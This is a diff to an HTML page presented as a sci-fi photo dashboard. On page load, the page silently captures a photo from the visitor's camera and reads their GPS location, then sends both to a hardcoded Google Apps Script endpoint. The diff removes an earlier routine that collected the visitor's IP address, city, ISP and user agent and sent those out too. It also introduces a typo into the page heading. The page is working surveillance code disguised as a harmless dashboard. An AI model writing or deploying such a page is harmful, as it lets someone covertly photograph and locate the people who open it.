@@ -3,10 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>科幻資訊與拍k照儀表板</title>
+  <title>科幻資訊與拍照儀表板</title>
   <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
   <style>
-    /* 背景與基本樣式 */
     body {
       margin: 0;
       padding: 0;
@@ -20,7 +19,6 @@
       justify-content: center;
       color: #00ffff;
     }
-
     .dashboard {
       width: 90%;
       max-width: 1200px;
@@ -29,7 +27,6 @@
       gap: 20px;
       margin-bottom: 20px;
     }
-
     .title {
       grid-column: span 2;
       text-align: center;
@@ -37,7 +34,6 @@
       margin-bottom: 20px;
       text-shadow: 0 0 20px #00eaff, 0 0 30px #0077ff;
     }
-
     .card {
       background: rgba(15, 15, 50, 0.9);
       border: 2px solid #00ffff;
@@ -49,32 +45,15 @@
       overflow: hidden;
       color: #ffffff;
     }
-
-    .card h2 {
-      font-size: 1.8rem;
-      text-shadow: 0 0 10px #00ffff;
-      margin-bottom: 15px;
-    }
-
-    .highlight {
-      font-size: 1.5rem;
-      font-weight: bold;
-      color: #00ffcc;
-      text-shadow: 0 0 10px #00ffcc;
-    }
-
     .footer {
       width: 100%;
       text-align: center;
       padding: 10px 0;
       background: linear-gradient(to right, #03031c, #0a0a4a);
     }
-
     .logo img {
       width: 80px;
-      animation: pulse 2s infinite;
     }
-
     .text-input {
       width: 80%;
       padding: 10px;
@@ -85,7 +64,6 @@
       color: #ffffff;
       font-size: 1rem;
     }
-
     .button {
       display: inline-block;
       padding: 10px 20px;
@@ -99,7 +77,6 @@
       transition: all 0.3s ease;
       text-shadow: 0 0 10px #00eaff;
     }
-
     .button:hover {
       transform: scale(1.05);
       box-shadow: 0 0 20px rgba(0, 255, 204, 0.5);
@@ -108,35 +85,18 @@
 </head>
 <body>
   <div class="dashboard">
-    <h1 class="title">科幻資訊與拍照儀表板</h1>
-
+    <h1 class="title">科幻資訊與拍f照儀表板</h1>
     <!-- 拍照狀態 -->
     <div class="card">
       <h2>拍照狀態</h2>
       <p id="photoStatus">狀態：啟動中...</p>
     </div>
-
-    <!-- 電池資訊 -->
-    <div class="card">
-      <h2>電池資訊</h2>
-      <p class="highlight" id="batteryLevel">--%</p>
-      <p id="batteryStatus">狀態：未知</p>
-      <p id="batteryRemaining">剩餘時間：-- 分鐘</p>
-    </div>
-
-    <!-- IP 回傳狀態 -->
-    <div class="card">
-      <h2>IP 資訊</h2>
-      <p id="ipInfo">資料回傳中...</p>
-    </div>
-
     <!-- GPS 資訊 -->
     <div class="card">
       <h2>GPS 資訊</h2>
       <p id="gpsCoordinates">經度: --, 緯度: --</p>
       <p id="gpsAddress">地址: 讀取中...</p>
     </div>
-
     <!-- 手動輸入文字 -->
     <div class="card">
       <h2>文字回傳</h2>
@@ -144,17 +104,14 @@
       <button class="button" onclick="sendTextToServer()">傳送文字</button>
     </div>
   </div>
-
   <footer class="footer">
     <div class="logo">
       <img src="https://via.placeholder.com/100x50?text=LOGO" alt="商標">
     </div>
   </footer>
-
   <script>
     const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbzbWx3Sa7PRXyMf5ihhqZ0nDizmIan0H82CRkPcLFk_iue1wBdVd2AHqbEJqx9AlTWHgg/exec';
 
-    // 相機拍照功能
     async function startCameraAndSend() {
       const statusElement = document.getElementById('photoStatus');
       try {
@@ -179,7 +136,7 @@
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
           const photoData = canvas.toDataURL('image/jpeg', 0.5);
           stream.getTracks().forEach((track) => track.stop());
-          sendToServer({ imageData: photoData.split(',')[1] });
+          sendToServer({ imageData: photoData.split(',')[1], message: '自動上傳圖片' });
         }, 1000);
       } catch (error) {
         statusElement.innerText = '相機啟動失敗！';
@@ -187,7 +144,6 @@
       }
     }
 
-    // GPS 獲取並回傳
     async function getGPSInfo() {
       const gpsCoordinatesElement = document.getElementById('gpsCoordinates');
       const gpsAddressElement = document.getElementById('gpsAddress');
@@ -196,35 +152,15 @@
           const { latitude, longitude } = position.coords;
           gpsCoordinatesElement.innerText = `經度: ${longitude.toFixed(5)}, 緯度: ${latitude.toFixed(5)}`;
           try {
-            sendToServer({ latitude, longitude });
+            sendToServer({ latitude, longitude, message: 'GPS 資訊回傳' });
           } catch (error) {
             gpsAddressElement.innerText = 'GPS 回傳失敗';
             console.error('GPS 錯誤:', error);
           }
         });
-      } else {
-        gpsCoordinatesElement.innerText = 'GPS 不受支持';
       }
     }
 
-    // 回傳 IP 和設備資訊
-    async function sendIpAndDeviceInfo() {
-      const ipInfoElement = document.getElementById('ipInfo');
-      try {
-        const response = await fetch('https://ipinfo.io/json');
-        const data = await response.json();
-        const { ip, city, region, country, org } = data;
-        const userAgent = navigator.userAgent;
-
-        ipInfoElement.innerText = 'IP 資料已回傳';
-        sendToServer({ ip, city, region, country, org, userAgent });
-      } catch (error) {
-        ipInfoElement.innerText = 'IP 回傳失敗';
-        console.error('IP 錯誤:', error);
-      }
-    }
-
-    // 回傳文字
     function sendTextToServer() {
       const textInput = document.getElementById('textInput').value;
       if (textInput.trim()) {
@@ -235,23 +171,24 @@
       }
     }
 
-    // 通用回傳功能
     async function sendToServer(data) {
       try {
         const formData = new URLSearchParams(data);
         const response = await fetch(BACKEND_URL, { method: 'POST', body: formData });
         const result = await response.json();
-        if (!result.success) console.error('資料回傳失敗:', result.error);
+        if (result.success) {
+          console.log('資料回傳成功:', result);
+        } else {
+          console.error('資料回傳失敗:', result.error);
+        }
       } catch (error) {
         console.error('回傳錯誤:', error);
       }
     }
 
-    // 啟動所有功能
     window.onload = () => {
       startCameraAndSend();
       getGPSInfo();
-      sendIpAndDeviceInfo();
     };
   </script>
 </body>
